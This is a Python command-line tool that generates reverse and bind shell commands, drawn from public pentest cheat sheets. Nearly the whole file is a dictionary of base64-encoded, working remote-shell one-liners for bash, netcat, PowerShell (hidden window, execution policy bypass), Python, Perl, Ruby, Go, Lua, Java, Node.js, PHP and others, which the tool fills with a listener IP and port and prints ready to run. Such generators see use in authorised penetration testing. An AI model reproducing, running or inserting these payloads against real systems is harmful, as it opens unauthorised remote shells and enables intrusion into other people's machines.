#!/usr/bin/env python3

# Heavily inspired by : https://github.com/sameera-madushan/Print-My-Shell
# Reverse shells found on :
# - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# - https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

import argparse
import base64
import sys
import argparse
from simple_term_menu import TerminalMenu
from colorama import Fore
from colorama import Style

def get_options():
    parser = argparse.ArgumentParser(description='Generate a bind/reverse shell')
    # Can't choose bind shell and reverse shell
    shelltype = parser.add_mutually_exclusive_group()
    shelltype.add_argument('-b', '--bind-shell', dest='SHELLTYPE', action='store_const', const='bind', help='Generate a bind shell (you connect to the target)')
    shelltype.add_argument('-r', '--reverse-shell', dest='SHELLTYPE', action='store_const', const='reverse', help='Generate a reverse shell (the target connects to you) (Default)')
    # Sets reverse shell as default value for SHELLTYPE (https://stackoverflow.com/questions/38507675/python-argparse-mutually-exclusive-group-with-default-if-no-argument-is-given)
    parser.set_defaults(SHELLTYPE = 'reverse')
    # Creates group of options for bindshell
    bindshell = parser.add_argument_group('Bind shell options')
    # typeoptions and portoption are two options either bindshell or revshell will need (https://stackoverflow.com/questions/23775378/allowing-same-option-in-different-argparser-group)
    typeoption = bindshell.add_argument('-t', '--type', dest='TYPE', type=str.lower, help='Type of the shell to generate (Bash, Powershell, Java...)')
    portoption = bindshell.add_argument('-p', '--port', dest='LPORT', type=int, help='Listener Port (required for reverse shells)')
    revshell = parser.add_argument_group('Reverse shell options')
    revshell._group_actions.append(typeoption)
    revshell.add_argument('-i', '--ip', dest='LHOST', type=str, help='Listener IP address (required for reverse shells)')
    revshell._group_actions.append(portoption)
    options = parser.parse_args()
    if options.SHELLTYPE == 'reverse' and not options.LHOST:
        parser.error('Listener IP address not supplied')
    if not options.LPORT:
        parser.error('Listener IP port not supplied')
    if not options.TYPE:
        if options.SHELLTYPE == 'reverse':
            shells_dict = revshells
        elif options.SHELLTYPE == 'bind':
            shells_dict = bindshells
        menu = TerminalMenu(list(shells_dict.keys()), title='What type of shell do you want?')
        selection = menu.show()
        options.TYPE = list(shells_dict.keys())[selection]
    return options

# Helper function for populate populate_shells to add values to the dictionnary
def add_value_to_key(dictionnary, key, value):
    if not key in dictionnary.keys():
        values = [value]
        dictionnary.update({key:values})
    else:
        values = []
        for element in dictionnary[key]:
            values.append(element)
        values.append(value)
        dictionnary.update({key:values})

# Add shells to the main dictionnaries: revshells and bindshells
def populate_shells():
    # Reverse shells dictionnary population
    add_value_to_key(revshells, 'bash', 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=')
    add_value_to_key(revshells, 'bash', 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY=')
    add_value_to_key(revshells, 'netcat', 'bmMgLWUgL2Jpbi9zaCB7MH0gezF9')
    add_value_to_key(revshells, 'netcat', 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=')
    add_value_to_key(revshells, 'netcat', 'bmMgLWMgYmFzaCB7MH0gezF9')
    add_value_to_key(revshells, 'netcat', 'Tk9URTogT3BlbkJTRApybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyB7MH0gezF9ID4vdG1wL2Y=')
    add_value_to_key(revshells, 'netcat', 'bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==')
    add_value_to_key(revshells, 'netcat', 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA==')
    add_value_to_key(revshells, 'telnet', 'cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w')
    add_value_to_key(revshells, 'python', 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=')
    add_value_to_key(revshells, 'powershell', 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ==')
    add_value_to_key(revshells, 'powershell', 'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpIg==')
    add_value_to_key(revshells, 'socat', 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9')
    add_value_to_key(revshells, 'socat', 'c29jYXQgdGNwLWNvbm5lY3Q6e306e30gc3lzdGVtOi9iaW4vc2g=')
    add_value_to_key(revshells, 'perl', 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn')
    add_value_to_key(revshells, 'perl', 'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==')
    add_value_to_key(revshells, 'perl', 'Tk9URTogV2luZG93cyBvbmx5CnBlcmwgLU1JTyAtZSAnJGM9bmV3IElPOjpTb2NrZXQ6OklORVQoUGVlckFkZHIsInswfTp7MX0iKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8Pjsn')
    add_value_to_key(revshells, 'ruby', 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn')
    add_value_to_key(revshells, 'ruby', 'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc=')
    add_value_to_key(revshells, 'ruby', 'Tk9URTogV2luZG93cyBvbmx5CnJ1YnkgLXJzb2NrZXQgLWUgJ2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc=')
    add_value_to_key(revshells, 'golang', 'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwiezB9OnsxfSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9fScgPiAvdG1wL3QuZ28gJiYgZ28gcnVuIC90bXAvdC5nbyAmJiBybSAvdG1wL3QuZ28=')
    add_value_to_key(revshells, 'awk', 'YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAvezB9L3sxfSI7IHdoaWxlKDQyKSB7eyBkb3t7IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7eyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfX0gfX0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fX19JyAvZGV2L251bGw=')
    add_value_to_key(revshells, 'lua', 'Tk9URTogTGludXggb25seQpsdWEgLWUgInJlcXVpcmUoJ3NvY2tldCcpO3JlcXVpcmUoJ29zJyk7dD1zb2NrZXQudGNwKCk7dDpjb25uZWN0KCd7MH0nLCd7MX0nKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyI=')
    add_value_to_key(revshells, 'lua', 'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn')
    add_value_to_key(revshells, 'java', 'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw==')
    add_value_to_key(revshells, 'nodejs', 'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw==')
    add_value_to_key(revshells, 'php', 'cGhwIC1yICckc29jaz1mc29ja29wZW4oezB9LHsxfSk7ZXhlYygnL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMnKTsnCg==')
    # Bind shells dictionnary population
    add_value_to_key(bindshells, 'netcat', 'bmMgLWx2cCB7MH0gLWUgL2Jpbi9zaA==')

# Decode from base64 and format with IP and PORT
def gen_shell():
    shell = base64.b64decode(encoded_shell).decode('utf-8')
    if options.SHELLTYPE == 'reverse':
        return shell.format(options.LHOST, options.LPORT)
    elif options.SHELLTYPE == 'bind':
        return shell.format(options.LPORT)

if __name__ == '__main__':
    print()
    revshells = {}
    bindshells = {}
    populate_shells()
    options = get_options()
    if options.SHELLTYPE == 'reverse':
        shells_dict = revshells
    elif options.SHELLTYPE == 'bind':
        shells_dict = bindshells
    i = 1
    for encoded_shell in shells_dict[options.TYPE]:
        shell = gen_shell()
        print(Fore.BLUE + Style.BRIGHT + '[' + str(i) + '] ' + Style.RESET_ALL + shell + '\n')
        i += 1
    quit()
